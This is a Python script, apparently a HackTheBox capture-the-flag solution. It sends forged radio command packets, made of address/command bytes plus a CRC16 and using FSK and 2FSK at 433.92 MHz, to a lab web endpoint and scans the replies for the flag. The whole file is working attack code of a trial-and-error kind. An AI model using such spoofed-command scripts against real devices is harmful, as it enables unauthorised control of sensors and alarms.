#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 146: La captura muestra FSK, no ASK - usar FSK!
print("[*] INNOVACIÓN 146: FSK modulation (capture shows FSK)")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    
    # FSK modulation!
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'FSK', 'bits': '1', 'msg': packet})
    print(f"  Sent {addr:02X}{cmd:02X} with FSK")
    time.sleep(0.2)

time.sleep(5)

# Verificar
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"\nStates after FSK: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
else:
    # Verificar updates
    r = s.get(f'{base_url}/updates')
    if 'HTB{' in r.text:
        print('[SUCCESS in updates]', re.findall(r'HTB\{[^}]+\}', r.text))
    else:
        print(r.text)

# INNOVACIÓN 147: FSK con bits=2
print("\n[*] INNOVACIÓN 147: FSK with bits=2")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'FSK', 'bits': '2', 'msg': packet})
    time.sleep(0.1)

time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 148: 2FSK specifically
print("\n[*] INNOVACIÓN 148: 2FSK modulation")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': '2FSK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(3)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States after 2FSK: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

print("\n[*] Innovaciones 146-148 completadas")
